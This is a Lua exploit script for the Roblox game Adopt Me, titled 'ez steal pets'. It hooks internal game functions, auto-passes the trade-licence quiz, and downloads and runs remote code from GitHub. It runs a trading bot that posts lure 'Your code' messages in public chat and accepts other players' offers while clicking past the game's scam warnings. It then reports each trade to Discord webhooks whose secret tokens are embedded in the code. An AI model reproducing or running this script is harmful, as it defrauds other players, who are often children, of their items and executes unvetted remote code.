-- Скрипт для перестевления ботов, с работающим дискордом

local Config = {
    WindowName = "ez steal pets",
    Color = Color3.fromRGB(255, 128, 64),
    Keybind = Enum.KeyCode.LeftShift
}

local i = 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = ("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")

local Player = Players.LocalPlayer
local wait = task.wait

local VirtualUser = game:GetService("VirtualUser")
Player.Idled:connect(
    function()
        VirtualUser:ClickButton2(Vector2.new())
    end
)



local Table = {6152116144, 185655149}
local Set = setfpscap

 

local Name = "Adopt me" .. " " .. Player.Name .. ".json"

Des = {}
if makefolder then
    makefolder("V.G Hub")
end

local Settings

if
    not pcall(
        function()
            readfile("V.G Hub//" .. Name)
        end
    )
 then
    writefile("V.G Hub//" .. Name, HttpService:JSONEncode(Des))
end
if readfile("V.G Hub//" .. Name) then
    Settings = HttpService:JSONDecode(readfile("V.G Hub//" .. Name))
end

local function Save()
    writefile("V.G Hub//" .. Name, HttpService:JSONEncode(Settings))
end



StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Warning",
        Text = "Added check for when your fully loaded in when executed please load into the game fully for script to execute"
    }
)


local getupvalue = getupvalue or debug.getupvalue
local getconstant = getconstant or debug.getconstant

local getconstants = getconstants or debug.getconstants
local getgc = getgc or get_gc_objects or debug.getgc
local getreg = getreg or getregistry or debug.getregistry
local get_thread_context = get_thread_context or getthreadcontext or getidentity or syn.get_thread_identity
local get_thread_identity = get_thread_context
local set_thread_context = set_thread_context or setthreadcontext or setidentity or syn.set_thread_identity
local set_thread_identity = set_thread_context

local Remotes = {}
local Inventorys = ReplicatedStorage.ClientDB.Inventory
local InventoryGiftsSubDB = require(Inventorys.InventoryGiftsSubDB)

local Stores = {
    "CoffeeShop",
    "Supermarket",
    "PizzaShop",
    "ToyShop",
    "Obbies",
    "Neighborhood",
    "CampingShop",
    "AutoShop",
    "Nursery",
    "Cave",
    "IceCream",
    "PotionShop",
    "SkyCastle",
    "Hospital",
    "HatShop",
    "PetShop",
    "School",
    "BabyShop",
    "HotSpringHouse",
    "SafetyHub",
    "DebugInterior",
    "VIP",
    "Salon",
    "SpleefMinigame",
    "SimonSaysMinigame",
    "WinterCastle"
}

local Baths = {
    "StylishShower",
    "CheapBathtub",
    "ModernShower",
    "Bathtub",
    "GingerbreadShower",
    "HotTub"
}

local FreeFoods = {
    "ham_vip",
    "water_vip",
    "chocolate_milk_vip",
    "popcorn_vip",
    "marshmallow_on_a_stick",
    "healing_apple",
    "teachers_apple",
}

local Beds = {
    "FancyPetBed",
    "ModernPetBed",
    "CircularPetBed",
    "RectangularPetBed",
    "NormalCrib",
    "BasicCrib",
    "RoyalCrib",
    "PoshCrib",
}
local Tasks = {
    "hungry",
    "sleepy",
    "thirsty",
    "bored",
    "dirty",
    "camping",
    "sick",
    "school",
    "hot_spring",
    "salon",
    "pizza_party"
}

local Egg = {
    "japan_2022_egg",
    "cracked_egg",
    "regular_pet_egg",
    "royal_egg",
    "retired_egg"
}

local gifts = {
    "smallgift",
    "biggift",
    "massivegift",
    "legend_hat_2022_simple_chest",
    "legend_hat_2022_regal_chest"
}
local Obbys = {
    "miniworld",
    "coastal_climb",
    "shipwreck_bay",
    "ancient_ruins",
    "lonelypeak",
    "pyramid",
    "tinyisles"
}

local RetardedBullShit = {
    "CashRegister",
    "GoldenCashRegister"
}

local PP = {}

local Part = Instance.new("Part")
Part.Name = "P"
Part.Size = Vector3.new(9e9,0,9e9)
Part.Anchored = true 
Part.Transparency = 0.5 
Part.CFrame = CFrame.new(5000,5000,5000)
Part.Parent = Workspace

local Location = nil
for i, v in pairs(getgc()) do
    if type(v) == "function" then
        if getfenv(v).script == ReplicatedStorage.ClientModules.Core.InteriorsM.InteriorsM then
            if table.find(getconstants(v), "LocationAPI/SetLocation") then
                Location = v
                break
            end
        end
    end
end
local function SetLocation(A, B, C)
    set_thread_identity(2)
    local O = get_thread_identity()
    Location(A, B, C)
    set_thread_identity(O)
    return A,B,C
end
function Home()
    if Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model") then
        return Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model").Name
    else
        return false
    end
end
function PersonHome()
    if Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model") then
        return Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model").Name
    else
        return false
    end
end 
function Store()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if not string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"MainMap") and not
                string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"Neighborhood")
         then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

function MainMap()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"MainMap") then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

function Neighborhood()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"Neighborhood") then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

function GoToStore(Name)
    if Store() == Name then
        return true
    end
    Workspace.Gravity = 0
    SetLocation(Name, "MainDoor", {})
    Workspace.Gravity = 196.2
    while Store() ~= Name do
        wait()
    end
    if Home() then
        return true
    end
    return false
end

function GoToNeighborhood()
    SetLocation("Neighborhood", "MainDoor", {})
    while not Neighborhood() do
        wait()

    end
    if Neighborhood() then

        return true
    end
    return false
end



function GoToMainMap()
    SetLocation("MainMap", "Neighborhood/MainDoor", {})
    while not MainMap() do
        Workspace.Gravity = 0
        wait()
    end
    if MainMap() then
        Workspace.Gravity = 196.2
        return true
    end
    return false
end

function GoToPersonsHouse(Name)
    SetLocation("housing","MainDoor",{["house_owner"] = Players[Name]})
    while not PersonHome() do
        Workspace.Gravity = 0
        wait()
    end 
    if PersonHome() then
        Workspace.Gravity = 196.2
        return true 
    end 
    return false
end 
function Bed(Name)
    GoToHome()
    Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(Beds, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"true/")[2]
            print(String)
            return String
        end
    end
end
function Cash()
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(RetardedBullShit, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"true/")[2]
            print(String)
            return String
        end
    end
end

function Showers(Name)
    GoToHome()
    Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6))
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(Baths, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"true/")[2]
            print(String)
            return String
        end
    end
end



local Neon = {}
local Spec = {}
Settings.Key = {}
local PetID
local Pet
local PetsShow = {}
local List = {}
local JoJo = {}
local GGO = {}
for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
    local Key = tostring(v["id"]) .. " - " .. tostring(v["properties"]["age"]) .. " years old"
    PetsShow[Key] = v
    table.insert(List, Key)
    table.sort(List, key)

end
for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
    if not table.find(JoJo,tostring(v["id"])) then
        local Key2 = tostring(v["id"])
        GGO[Key2] = v 
        table.insert(JoJo,Key2)
        table.sort(JoJo)
    end 
end 
UserInputService.WindowFocusReleased:Connect(
    function()
        if Settings.Render then
            RunService:Set3dRenderingEnabled(false)
            if table.find(Table, game.PlaceId) then
                Set(30)
            else
                Set(5)
            end
        end 
    end
)
UserInputService.WindowFocused:Connect(
    function()
        if Settings.Render then
            RunService:Set3dRenderingEnabled(true)
            Set(100)
        end 
    end
)

for i, v in pairs(getupvalue(require(ReplicatedStorage.Fsys).load("RouterClient").init, 4)) do
    v.Name = i
end
pcall(
    function()
        ReplicatedStorage.API:FindFirstChild("DailyLoginAPI/ClaimDailyReward"):InvokeServer()
    end
)

if Settings.Petsd == nil then
    Settings.Petsd = "Pets"
end


local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/1ss2e/main/scri11"))()
local Window = Library:CreateWindow(Config, CoreGui)

local Tab1 = Window:CreateTab("Adopt Me")
local Tab2 = Window:CreateTab("UI Settings")

local Section1 = Tab1:CreateSection("")
local Section3 = Tab2:CreateSection("Menu")
local Section4 = Tab2:CreateSection("Background")
--local Section5 = Tab2:CreateSection("Misc")

-------------

local Button1 = Section1:CreateButton("Grab trade linence", function()
GoToStore("SafetyHub")
Workspace.Gravity = 0
ReplicatedStorage.API:FindFirstChild("TradeAPI/BeginQuiz"):FireServer()
for i,v in pairs(getgc(true)) do
    if type(v) == "table" and rawget(v,"question_index") then
        for i,v in pairs(v.quiz) do
            ReplicatedStorage.API:FindFirstChild("TradeAPI/AnswerQuizQuestion"):FireServer(v.answer)
        end 
    end 
end
wait(2)

GoToNeighborhood()
end)

local function Copy()
    sam2 = tostring(Player.Character.HumanoidRootPart.CFrame)
    local result3 = sam2.sub(sam2, 0, 33)
    setclipboard(tostring(result3))
end

local Button2 = Section1:CreateButton("Grab coordinates", function()
    Copy()
end)

local Button = Section1:CreateButton("Start bot", function()
-- Работающий скрипт, убраны слоты которые переработали.
json = loadstring(game:HttpGet(('https://raw.githubusercontent.com/rxi/json.lua/master/json.lua')))()

local https = game:GetService('HttpService')
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local Player = Players.LocalPlayer
local wait = task.wait

loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/itrScri/main/fmg.lua"))()
local Webhook = "https://discord.com/api/webhooks/1041757702960980121/N1TuHBGCcqCjfZQBZgpjT5uzg6qo8i7PAAkm9grxpATpdzfaEOWaXy-FANf36E1zqKYM"
local webhook2 = "https://discord.com/api/webhooks/1069275478545944766/-ZnKO86KllyneMmlBoyFeqg0Mt--etvYYnlhSntVqBU1OH-MSbn7NDu8y-xT6H373Bnn"
local radius = 150
local Xc = 0
local Zc = 0
local angle = 0

local player = game.Players.LocalPlayer
local bad_items = {
    ['rbxassetid://2582282124'] = 'Sandwich',
    ['rbxassetid://7137574255'] = 'Honey candy',
    ['rbxassetid://1043331236'] = 'Watermelon',
    ['rbxassetid://1373237029'] = 'Big head potion'
    
}
GoToNeighborhood()
_G.accepts = 0
_G.confirms = 0
_G.button = nil
_G.accepted = false


_G.declined = false
_G.first_360 = nil

function button_click (button_obj)
    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
    
    for i,v in pairs(events) do
        for _,connection in pairs(getconnections(button_obj[v])) do
			pcall(function ()
				connection:Fire()
			end)
        end
    end
end

function decline ()
	pcall(function ()
		decline_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline
    	button_click(decline_button)
	end)
    
    _G.accepts = 0
end

function cash_out ()
	pcall(function ()
		cash_button = game:GetService("Players")[player.Name].PlayerGui.CheckApp.Frame.Buttons.CashOut
		button_click(cash_button)
	end)
end




function sendToDiscord(color, message, everyone)
	MyNick = game:GetService("Players").LocalPlayer.Name
	ChelNick = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Header.PartnerLabel.Text
	
    
    local t = os.date("!*t")
	local s = {}
	for k, v in pairs(t) do
	  local temp = tostring(v)
	  if #temp == 1 then temp = "0" .. temp end
	  s[k] = temp
	end
	
	timestamp = s.year .. "-" .. s.month .. "-" .. s.day  .. "T" .. s.hour .. ":" .. s.min .. ":" .. s.sec .. "." .. "000Z"

  	local embed = {
        {
            ["color"] = color,
            ["title"] = "Trade confrimed",
            ["description"] = message,
            ["fields"] = {
				{
					['name'] = 'Bot',
					['value'] = MyNick,
					['inline'] = false
				},
				{
					['name'] = 'Player',
					['value'] = ChelNick,
					['inline'] = false
				}
			},
			["timestamp"] = timestamp
        }
    }

	if everyone == false or everyone == nil then
		content = ''
	else
		content = '@everyone'
	end

	local data = {
		["content"] = content,
		["username"] = 'Pets2',
		["embeds"] = embed
	}
    
local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
  	local data_for_request = {Url = Webhook, Body = game:GetService('HttpService'):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
	good_request = http_request or request or HttpPost or syn.request
	good_request(data_for_request)
end

function sendTo2Discord(color, message, everyone)

    local t = os.date("!*t")
	local s = {}
	for k, v in pairs(t) do
	  local temp = tostring(v)
	  if #temp == 1 then temp = "0" .. temp end
	  s[k] = temp
	end
	
	timestamp = s.year .. "-" .. s.month .. "-" .. s.day  .. "T" .. s.hour .. ":" .. s.min .. ":" .. s.sec .. "." .. "000Z"

  	local embed = {
        {
            ["color"] = color,
            ["description"] = message,
            ["timestamp"] = timestamp
        }
    }

	if everyone == false or everyone == nil then
		content = ''
	else
		content = '@everyone'
	end

	local data = {
		["content"] = content,
		["username"] = 'Ids',
		["embeds"] = embed
	}
    
local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
  	local data_for_request = {Url = webhook2, Body = game:GetService('HttpService'):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
	good_request = http_request or request or HttpPost or syn.request
	good_request(data_for_request)
end

car_cframe = game:GetService("Workspace").Interiors["Neighborhood/Fall"].Static.CarStand.MagicalGirlCar.Body.MainBody.CFrame

default_cframe = CFrame.new(car_cframe.x - 47, car_cframe.y + 0, car_cframe.z + 31)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = default_cframe
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
angle = 360

local runservice = game:GetService("RunService") -- this is the service for the fps idk it handles all processing

local player = game:GetService("Players").LocalPlayer
runservice.Stepped:Connect(function()
    for i,v in pairs(player.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false -- this disables the collision in your character(ALL COLLISIONS are disabled except for standing)
        end
    end
end)

wait(1)


game.RunService.RenderStepped:Connect(function ()
	--if (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z - default_cframe.Z) > 15 then
	--	angle = 0
	--	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = default_cframe
	--	wait(3)
	--end
	if angle == 360 then
		if _G.first_360 == nil then
			_G.first_360 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _G.first_360
		angle = 0
	end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 10
  	local x = radius * math.cos(math.rad(angle)) + Xc
  	local z = radius * math.sin(math.rad(angle)) + Zc
  	game.Players.LocalPlayer.Character.Humanoid:Move(Vector3.new(x,0,z))
	angle = angle + 1
end)

while wait(1) do
	_G.accepted = false
	
	if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
		game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
	end


	if pcall(function()
	   abc_button = game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate
	end) then
		_G.confirms = 0
	    _G.accepts = 0

		if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
			game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
		end

	

		pcall(function()
		   	if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
				button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
			end
		end)

		
		wait(.1)
		

		pcall(function()
		   	if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
				button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
			end
		end)
		

	    for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
	        if button.Name == 'ButtonTemplate' then
	            if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
					_G.button = button
	                button_click(_G.button)
	            	break
				end
	        end
	    end

		
		wait(.1)
		

		pcall(function()
		   	if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Be careful when trading') then
				button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
			end
		end)

		game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true

		
		wait(.2)
	

		Parthner_Nick = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Header.PartnerLabel.Text

		wait(.1)
	

		local A_1 = " Hello : " .. Parthner_Nick
		local A_2 = "To " .. Parthner_Nick
		local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)

		wait(.5)

		local A_1 = " Your code : #### ####"
		rand = math.floor(math.random(1, 2))
		
		if rand == 1 then
			A_1 = " Your code : #### ####"
		else
			A_1 = " Your code : #### ###"
		end

		local A_2 = "To " .. Parthner_Nick
		local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
		wait(.5)

		if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency == 1 then
			game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
		end

	    while wait(.01) do
			

			_G.aboba = false
			for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
	    	    if button.Name == 'ButtonTemplate' then
	    	        if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
						_G.aboba = true
	    	        	break
					end
	    	    end
	    	end
			if _G.aboba == true then
				break
			end

			if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
				game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true
			end

			if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
				break
			end

	        _G.accepts = _G.accepts + 1
	
	        if _G.accepts >= 18000 then
	            _G.accepts = 0
	            decline()
	            break
	        end
        
local ResultToCofrimed
local TradePassed = true
        function CheckSlots()
            local e = 1
            local a = 1
            local ItsEnd = false
            local CheckAgain = false
            local Checked = 0 
            TradePassed = true
                local ItsAccepted = true
			    local MessageMassive = {}
                local MessageMassive2 = {}
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                            if v.Image == id.image then
                                game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true  
                                ItsAccepted = false
                                MessageMassive[a] = id.name
                                a = a + 1
                                TradePassed = false
                                print("asd123sad123")
                                break
                            end                            
                        end
                    end
                end
                if TradePassed == false then
                    local A_1 = "Уберите из трейда | Remove from trade: " .. table.concat(MessageMassive, ", ")
                    local A_2 = "To " .. Parthner_Nick
                    local Event = game.TextChatService.TextChannels.RBXGeneral:SendAsync(A_1)
                end
                if TradePassed == true then
                for i, v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
                    if v.Name == 'ItemImageTemplate' then
                        for i, id in pairs(entries) do  
                                local sam = v.Image
                                print("99999999999")
                                local stringgg = sam.sub(sam, 14, 25)   -- удалить с 3й позиции 2 символа, т. е. 'бо'
                                MessageMassive2[e] = "https://web.roblox.com/library/" .. stringgg
                                e = e + 1

                                break
                                end
                            end   
                        end 
                    local result2 = table.concat(MessageMassive2, ", ")
                    print(result2)
                    ResultToCofrimed = result2
                    sendTo2Discord(15753920, result2)
                    print("yeeeeeee")
                end
            end
	if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 and _G.accepted == false then
				_G.accepted = true
                CheckSlots()
                local UnAccepted = false
                if TradePassed == false then
                    repeat wait(0.2) 
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency == 1 then
                            print("UnAccepted")
                            UnAccepted = true
                        end
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            UnAccepted = true
                            print("breaked")
                            break
                        end
                    until UnAccepted == true
                        if UnAccepted == true then
                        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                            print("breaked")
                            break
                        end
                            repeat wait(0.2)
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                    print("breaked")
                                    break
                                end
                                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Accepted.ImageTransparency ~= 1 then
                                    _G.accepted = true
                                    CheckSlots()
                                    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
                                        Phase2Reached = true
                                        print("breaked")
                                        break
                                    end
                                    local Phase2Reached = true
                                    break
                                end
                            until Phase2Reached == true
                    end
                end
                
                if TradePassed == true then

				if _G.declined == true then
					_G.declined = false
					break
				end

				if pcall(function ()
					accept_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept
				end) then
					wait(.01)
	            	button_click(accept_button)
					wait(1)
                    ItsAccepted = false
                    CheckAgain = false
				end

			
	            while wait(.01) do
					pcall(function()
					   	if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
							button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
						end
					end)

				

					pcall(function()
					   	if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
							button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
						end
					end)
					

					_G.aboba = false
					for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
	    			    if button.Name == 'ButtonTemplate' then
	    			        if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
								_G.aboba = true
	    			        	break
							end
	    			    end
	    			end
					if _G.aboba == true then
						break
					end
					if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
						break
					end

					
				-- Раньше тут были слоты, но из за их реформы скрипт не работал и их пришлось убрать
				--	_G.slots = 0
				--	for i,v in pairs(game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots:GetDescendants()) do
				--		if v.Name == 'ItemImageTemplate' then
		--					_G.slots = _G.slots + 1
			--			end
			--		end

				--	if _G.slots == 0 then
--break
				--	end

	                _G.confirms = _G.confirms + 1
	
	                if _G.confirms > 18000 then
	                    _G.confirms = 0
	                    decline()
	                    break
	                end

	                if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerOffer.Accepted.ImageTransparency ~= 1 then
	                    _G.confirms = 0
	                    _G.accepts = 0

						if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == false then
							break
						end
						
						if Parthner_Nick == "AinsOulgorn" then
						    
						    decline()
						    break
						end
						if Parthner_Nick == "SOMANYCHARACTERS" then

                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                            break
						end
                     
                        if Parthner_Nick == OldNick then
        
                            button_click(confirm_button)
                            wait(1)
                            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
                        break
                        else
						
						pcall(function ()
							confirm_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.ConfirmationFrame.Accept
	                		button_click(confirm_button)
                            print(ResultToCofrimed)
                            OldNick = Parthner_Nick
                            sendToDiscord(15753920, ResultToCofrimed, true)
						end)
						game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
						

		

	                    break
                    end
	                    end
	                end
	            end
	        end
	    end
	end

	wait(1)
end
end)

local Button2 = Section1:CreateButton("Урезать графику", function()
for i,v in pairs(game:GetService("Workspace").Interiors:GetDescendants()) do
    if v:IsA("BasePart") then
        v.Transparency = 1 
    end 
end 

game:GetService("Workspace").Interiors.DescendantAdded:Connect(function(v)
    if v:IsA('BasePart') and Hide then
        v.Transparency = 1 
    end 
end)
end)

local Toggle3 = Section3:CreateToggle("UI Toggle", nil, function(State)
	Window:Toggle(State)
end)
Toggle3:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key)
	Config.Keybind = Enum.KeyCode[Key]
end)
Toggle3:SetState(true)
local Colorpicker3 = Section3:CreateColorpicker("UI Color", function(Color)
	Window:ChangeColor(Color)
end)
Colorpicker3:UpdateColor(Config.Color)

-- credits to jan for patterns
local Dropdown3 = Section4:CreateDropdown("Image", {"Default","Hearts","Abstract","Hexagon","Circles","Lace With Flowers","Floral"}, function(Name)
	if Name == "Default" then
		Window:SetBackground("2151741365")
	elseif Name == "Hearts" then
		Window:SetBackground("6073763717")
	elseif Name == "Abstract" then
		Window:SetBackground("6073743871")
	elseif Name == "Hexagon" then
		Window:SetBackground("6073628839")
	elseif Name == "Circles" then
		Window:SetBackground("6071579801")
	elseif Name == "Lace With Flowers" then
		Window:SetBackground("6071575925")
	elseif Name == "Floral" then
		Window:SetBackground("5553946656")
	end
end)
Dropdown3:SetOption("Default")

local Colorpicker4 = Section4:CreateColorpicker("Color", function(Color)
	Window:SetBackgroundColor(Color)
end)
Colorpicker4:UpdateColor(Color3.new(1,1,1))

local Slider3 = Section4:CreateSlider("Transparency",0,1,nil,false, function(Value)
	Window:SetBackgroundTransparency(Value)
end)
Slider3:SetValue(0)

local Slider4 = Section4:CreateSlider("Tile Scale",0,1,nil,false, function(Value)
	Window:SetTileScale(Value)
end)
Slider4:SetValue(0.5)
